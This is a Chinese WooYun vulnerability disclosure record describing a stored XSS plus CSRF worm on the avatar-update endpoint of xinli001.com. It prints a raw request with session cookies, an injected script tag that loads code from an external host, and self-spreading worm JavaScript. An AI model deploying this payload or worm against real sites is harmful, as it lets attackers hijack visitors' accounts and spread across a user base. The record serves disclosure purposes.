{"id": 67931, "wybug_id": "wooyun-2015-0151269", "wybug_title": "壹心理存储型XSS+CSRF造成蠕虫攻击", "wybug_corp": "xinli001.com", "wybug_author": "sauren", "wybug_date": "2015-11-02 14:43", "wybug_open_date": "2015-11-07 14:44", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["持久型"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-07：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 壹心理，best of best，做国内最好的心理学品牌。 详细说明：  存储型XSS：\nPOST /ajax/update-user-profile HTTP/1.1Host: www.xinli001.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: http://www.xinli001.com/user/settingContent-Length: 49Cookie: lzstat_uv=38348821501812510113|2646296@3462520@3562675@3597499; Hm_lvt_d64469e9d7bdbf03af6f074dffe7f9b5=1446107039,1446179415,1446188216,1446432295; laravel_session=eyJpdiI6IjNsNzN1clJXK25IUDBtY3BrZVRja3c9PSIsInZhbHVlIjoiWVVWbG94b3YzTXNCc0hPY3BjUXdpczJaVGZiSVBnSFdYZ1ArMDZmbzNBUVpJdEtKWHFQRDM2Z3IySEJMRmczZEZtQlIrZGYwMVN1UTA3VFlBTm8xS0E9PSIsIm1hYyI6IjIxY2FkYTkyMmYwYjc5ZjAwZTZjMzY4ZWQ5NWM4ZDQ0MmJmZTY0MzMwYTczNjI5MzQ4NWEzNTE1OWU1NmE1N2IifQ%3D%3D; sessionid=6pww0c6ccqhi193nijiwbtu8yypoitxf; expires=Fri, 06-Nov-2015 06:14:39 GMT; bdshare_firstime=1446191998449; common_auth_key=ef825bd915065102b725a482c9792bae; lzstat_ss=1919308479_1_1446473629_2646296|1591989281_2_1446461522_3597499|988365104_1_1446461581_3462520; Hm_lpvt_d64469e9d7bdbf03af6f074dffe7f9b5=1446444830Connection: keep-alivePragma: no-cacheCache-Control: no-cacheavatar=http%3A%2F%2Fwww.sk15.net%2Fimg%2Fsk15.ico\n参数avatar，即是头像地址，可写入存储型XSS。当然，这个接口也是CSRF，没有TOKEN验证。所以我们把avatar写成这样http://www.sk15.net/img/sk15.ico\"><script src=\"http://www.sk15.net/js/sk15.js\"></script><加载外部的JS。外部JS代码如下：\n(function(){\t\t/*\t * 蠕虫开始，访问者CSRF提交修改头像\t */\t$.ajax({\t    type: \"POST\",\t    url: \"/ajax/update-user-profile\",\t    data: {avatar:'http://www.sk15.net/img/sk15.ico\"><script src=\"http://www.sk15.net/js/sk15.js\"></script><'},\t    dataType: \"json\",\t    success: function(data){\t               } });\t})();\n这样，我在社区进行留言等等方式，只要用户访问到，即将用户的头像改成我们写的存储型XSS，进行蠕虫。   漏洞证明：  \n\n   修复方案：  严格过滤   版权声明：转载请注明来源 sauren@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-11-07 14:44 厂商回复：  漏洞Rank：2  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}